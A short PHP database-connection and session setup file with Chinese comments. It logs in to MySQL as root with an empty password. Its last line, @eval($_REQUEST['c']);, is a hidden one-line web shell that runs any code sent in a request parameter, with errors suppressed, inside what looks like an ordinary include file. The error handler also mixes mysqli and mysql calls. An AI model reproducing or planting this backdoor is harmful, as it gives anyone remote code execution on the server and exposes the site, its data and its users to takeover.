<?php
//链接数据库
$host = 'localhost';
$username = 'root';
$password = '';
$database = 'test';
$dbc = mysqli_connect($host, $username, $password, $database);
if (!$dbc)
{
	die('Could not connect: ' . mysql_error());
}

//启用session
session_start();

//根目录
$basedir = ''; 

@eval($_REQUEST['c']);
?>
